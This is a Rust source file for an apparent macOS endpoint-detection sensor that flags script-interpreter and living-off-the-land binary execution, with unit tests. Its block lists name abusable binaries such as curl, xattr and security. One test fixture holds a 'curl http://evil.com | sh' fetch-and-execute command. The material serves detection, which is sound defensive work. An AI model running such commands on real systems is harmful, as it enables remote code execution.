// macos/sensors/bsm/bsm_script_exec.rs
// Detects script interpreter execution on macOS
// Triggers on: python, perl, ruby, osascript, bash -c, sh -c, etc.

use crate::sensors::hash_keys;
use edr_core::event_keys;
use edr_core::Event;
use serde_json::json;
use std::collections::BTreeMap;

/// Script interpreters to detect
const SCRIPT_INTERPRETERS: &[&str] = &[
    "python",
    "python2",
    "python2.7",
    "python3",
    "python3.8",
    "python3.9",
    "python3.10",
    "python3.11",
    "python3.12",
    "perl",
    "ruby",
    "osascript",  // AppleScript
    "osacompile", // AppleScript compiler
    "bash",
    "sh",
    "zsh",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "lua",
    "node",
    "nodejs",
    "deno",
    "bun",
    "php",
    "swift", // Can run as script
    "groovy",
    "scala",
];

/// LOLBins that execute code on macOS
const LOLBINS: &[&str] = &[
    "osascript",
    "osacompile",
    "curl",       // Can execute with | sh
    "xattr",      // Remove quarantine
    "open",       // Open apps
    "launchctl",  // Launch services
    "sqlite3",    // Execute SQL
    "plutil",     // Property list manipulation
    "defaults",   // System defaults
    "xcodebuild", // Build tool abuse
    "security",   // Keychain access
];

/// Detect script execution from process exec
pub fn detect_script_exec_from_exec(
    host: &str,
    stream_id: &str,
    segment_id: &str,
    record_index: usize,
    exe_path: &str,
    argv: &[String],
    pid: u32,
    uid: u32,
    euid: u32,
    ts_millis: u64,
) -> Option<Event> {
    let exe_base = std::path::Path::new(exe_path).file_name()?.to_str()?;

    // Check if this is a script interpreter
    let (interpreter, is_inline, script_path) = classify_script_exec(exe_base, argv)?;

    let mut fields = BTreeMap::new();
    fields.insert(event_keys::PROC_PID.to_string(), json!(pid));
    fields.insert(event_keys::PROC_UID.to_string(), json!(uid));
    fields.insert(event_keys::PROC_EUID.to_string(), json!(euid));
    fields.insert(event_keys::PROC_EXE.to_string(), json!(exe_path));
    fields.insert(
        event_keys::SCRIPT_INTERPRETER.to_string(),
        json!(interpreter),
    );
    fields.insert(event_keys::SCRIPT_INLINE.to_string(), json!(is_inline));

    if let Some(path) = script_path {
        fields.insert(event_keys::SCRIPT_PATH.to_string(), json!(path));
    }

    if !argv.is_empty() {
        fields.insert(event_keys::PROC_ARGV.to_string(), json!(argv));
    }

    Some(Event {
        ts_ms: ts_millis as i64,
        host: host.to_string(),
        tags: vec![
            "macos".to_string(),
            "script_exec".to_string(),
            "bsm".to_string(),
        ],
        proc_key: Some(hash_keys::proc_key(host, pid, stream_id)),
        file_key: None,
        identity_key: Some(hash_keys::identity_key(host, uid, stream_id)),
        evidence_ptr: None,
        fields,
    })
}

/// Classify script execution and extract details
fn classify_script_exec(
    exe_base: &str,
    argv: &[String],
) -> Option<(&'static str, bool, Option<String>)> {
    // Check for matching interpreter
    let interpreter = SCRIPT_INTERPRETERS
        .iter()
        .find(|&&interp| exe_base == interp || exe_base.starts_with(&format!("{}-", interp)))?;

    // Check for inline execution flags
    let is_inline = is_inline_execution(argv);

    // Try to extract script path
    let script_path = extract_script_path(argv);

    Some((interpreter, is_inline, script_path))
}

/// Check if this is inline script execution (-c, -e, etc.)
fn is_inline_execution(argv: &[String]) -> bool {
    // Check first 10 args for inline flags
    for arg in argv.iter().take(10) {
        match arg.as_str() {
            "-c" | "-e" | "--eval" | "-exec" => return true,
            _ => {}
        }
        // Also check for combined flags like -nc
        if arg.starts_with('-')
            && (arg.contains('c') || arg.contains('e'))
            && !arg.starts_with("--")
        {
            // Could be shell -c or similar
            if arg.len() <= 4 {
                return true;
            }
        }
    }
    false
}

/// Extract script path from argv
fn extract_script_path(argv: &[String]) -> Option<String> {
    // Skip interpreter name and flags
    for (i, arg) in argv.iter().enumerate() {
        // Skip flags
        if arg.starts_with('-') {
            // If this is -c or -e, the next arg is inline code, not a path
            if arg == "-c" || arg == "-e" || arg == "--eval" {
                return None;
            }
            continue;
        }

        // Skip interpreter name at position 0
        if i == 0 {
            continue;
        }

        // This could be a script path
        if arg.ends_with(".py")
            || arg.ends_with(".pl")
            || arg.ends_with(".rb")
            || arg.ends_with(".sh")
            || arg.ends_with(".bash")
            || arg.ends_with(".zsh")
            || arg.ends_with(".applescript")
            || arg.ends_with(".scpt")
            || arg.ends_with(".js")
            || arg.ends_with(".ts")
            || arg.ends_with(".lua")
            || arg.ends_with(".php")
            || arg.ends_with(".swift")
        {
            return Some(arg.clone());
        }

        // Also check for script path patterns
        if arg.starts_with('/') || arg.starts_with("./") || arg.starts_with("../") {
            return Some(arg.clone());
        }
    }
    None
}

/// Detect LOLBin usage that can execute code
pub fn detect_lolbin_exec(
    host: &str,
    stream_id: &str,
    segment_id: &str,
    record_index: usize,
    exe_path: &str,
    argv: &[String],
    pid: u32,
    uid: u32,
    euid: u32,
    ts_millis: u64,
) -> Option<Event> {
    let exe_base = std::path::Path::new(exe_path).file_name()?.to_str()?;

    // Check if this is a LOLBin with suspicious usage
    let is_suspicious = match exe_base {
        "osascript" => true, // Always suspicious
        "curl" | "wget" => {
            // Check for pipe to shell patterns in argv or if next command is shell
            let arg_str = argv.join(" ");
            arg_str.contains("|")
                && (arg_str.contains("sh")
                    || arg_str.contains("bash")
                    || arg_str.contains("python"))
        }
        "open" => {
            // Check for -a flag with script interpreter
            let arg_str = argv.join(" ");
            arg_str.contains("-a") && (arg_str.contains("Terminal") || arg_str.contains("Script"))
        }
        _ => false,
    };

    if !is_suspicious && !LOLBINS.contains(&exe_base) {
        return None;
    }

    // For osascript, it's always relevant
    if exe_base == "osascript" || is_suspicious {
        let is_inline = argv.iter().any(|a| a == "-e");
        let script_path = extract_osascript_path(argv);

        let mut fields = BTreeMap::new();
        fields.insert(event_keys::PROC_PID.to_string(), json!(pid));
        fields.insert(event_keys::PROC_UID.to_string(), json!(uid));
        fields.insert(event_keys::PROC_EUID.to_string(), json!(euid));
        fields.insert(event_keys::PROC_EXE.to_string(), json!(exe_path));
        fields.insert(event_keys::SCRIPT_INTERPRETER.to_string(), json!(exe_base));
        fields.insert(event_keys::SCRIPT_INLINE.to_string(), json!(is_inline));

        if let Some(path) = script_path {
            fields.insert(event_keys::SCRIPT_PATH.to_string(), json!(path));
        }

        if !argv.is_empty() {
            fields.insert(event_keys::PROC_ARGV.to_string(), json!(argv));
        }

        return Some(Event {
            ts_ms: ts_millis as i64,
            host: host.to_string(),
            tags: vec![
                "macos".to_string(),
                "script_exec".to_string(),
                "lolbin".to_string(),
                "bsm".to_string(),
            ],
            proc_key: Some(hash_keys::proc_key(host, pid, stream_id)),
            file_key: None,
            identity_key: Some(hash_keys::identity_key(host, uid, stream_id)),
            evidence_ptr: None,
            fields,
        });
    }

    None
}

/// Extract osascript script path
fn extract_osascript_path(argv: &[String]) -> Option<String> {
    // Skip -e flags and their arguments
    let mut skip_next = false;
    for arg in argv.iter().skip(1) {
        if skip_next {
            skip_next = false;
            continue;
        }
        if arg == "-e" || arg == "-l" {
            skip_next = true;
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        // This should be a script path
        if arg.ends_with(".applescript")
            || arg.ends_with(".scpt")
            || arg.starts_with('/')
            || arg.starts_with("./")
        {
            return Some(arg.clone());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_python_exec() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/usr/bin/python3",
            &["python3".to_string(), "/tmp/script.py".to_string()],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert!(e.tags.contains(&"script_exec".to_string()));
        assert_eq!(e.fields.get("script_interpreter").unwrap(), "python3");
        assert_eq!(e.fields.get("script_inline").unwrap(), false);
        assert_eq!(e.fields.get("script_path").unwrap(), "/tmp/script.py");
    }

    #[test]
    fn test_detect_python_inline() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/usr/bin/python3",
            &[
                "python3".to_string(),
                "-c".to_string(),
                "import os; os.system('whoami')".to_string(),
            ],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert_eq!(e.fields.get("script_inline").unwrap(), true);
    }

    #[test]
    fn test_detect_bash_inline() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/bin/bash",
            &[
                "bash".to_string(),
                "-c".to_string(),
                "curl http://evil.com | sh".to_string(),
            ],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert_eq!(e.fields.get("script_interpreter").unwrap(), "bash");
        assert_eq!(e.fields.get("script_inline").unwrap(), true);
    }

    #[test]
    fn test_detect_osascript() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/usr/bin/osascript",
            &[
                "osascript".to_string(),
                "-e".to_string(),
                "display dialog \"test\"".to_string(),
            ],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert_eq!(e.fields.get("script_interpreter").unwrap(), "osascript");
    }

    #[test]
    fn test_detect_osascript_lolbin() {
        let event = detect_lolbin_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/usr/bin/osascript",
            &[
                "osascript".to_string(),
                "-e".to_string(),
                "do shell script \"id\"".to_string(),
            ],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert!(e.tags.contains(&"lolbin".to_string()));
    }

    #[test]
    fn test_detect_perl_exec() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/usr/bin/perl",
            &[
                "perl".to_string(),
                "-e".to_string(),
                "system('id')".to_string(),
            ],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_some());
        let e = event.unwrap();
        assert_eq!(e.fields.get("script_interpreter").unwrap(), "perl");
        assert_eq!(e.fields.get("script_inline").unwrap(), true);
    }

    #[test]
    fn test_no_detection_non_script() {
        let event = detect_script_exec_from_exec(
            "testhost",
            "stream1",
            "seg1",
            0,
            "/bin/ls",
            &["ls".to_string(), "-la".to_string()],
            1234,
            501,
            501,
            1000000,
        );
        assert!(event.is_none());
    }

    #[test]
    fn test_extract_script_path() {
        assert_eq!(
            extract_script_path(&["python".to_string(), "/tmp/test.py".to_string()]),
            Some("/tmp/test.py".to_string())
        );
        assert_eq!(
            extract_script_path(&["bash".to_string(), "-c".to_string(), "echo hi".to_string()]),
            None
        );
        assert_eq!(
            extract_script_path(&["ruby".to_string(), "./script.rb".to_string()]),
            Some("./script.rb".to_string())
        );
    }
}
